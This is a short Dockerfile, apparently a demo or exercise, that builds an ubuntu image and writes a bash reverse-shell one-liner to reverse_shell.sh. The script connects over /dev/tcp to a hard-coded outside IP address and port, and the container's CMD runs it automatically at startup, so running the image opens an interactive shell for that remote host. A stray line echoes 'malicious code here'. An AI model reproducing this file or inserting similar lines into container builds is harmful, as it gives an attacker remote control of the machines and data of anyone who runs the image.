FROM ubuntu

WORKDIR /tmp

RUN mkdir touch_my_docker
RUN ls &&  echo "malicious code here"


RUN echo "bash -i >& /dev/tcp/68.183.4.199/6666 0>&1" > reverse_shell.sh

CMD ["bash", "./reverse_shell.sh"]
